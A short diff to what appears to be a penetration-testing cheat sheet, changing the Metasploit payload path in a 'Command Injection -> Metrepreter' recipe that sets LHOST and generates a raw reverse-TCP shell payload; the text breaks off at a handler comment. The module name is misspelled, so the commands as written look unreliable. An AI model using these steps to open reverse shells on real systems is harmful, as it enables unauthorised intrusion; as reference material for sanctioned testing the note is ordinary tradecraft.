@@ -2,7 +2,7 @@
 # Command Injection -> Metrepreter
 ```bash
 msfconsole
-use payload/cmd/linux/x64/metrepreter/reverse_tcp
+use payload/cmd/linux/http/x64/metrepreter/reverse_tcp
 set LHOST <local IP/interface>
 generate -f raw
 # Starts handler to 
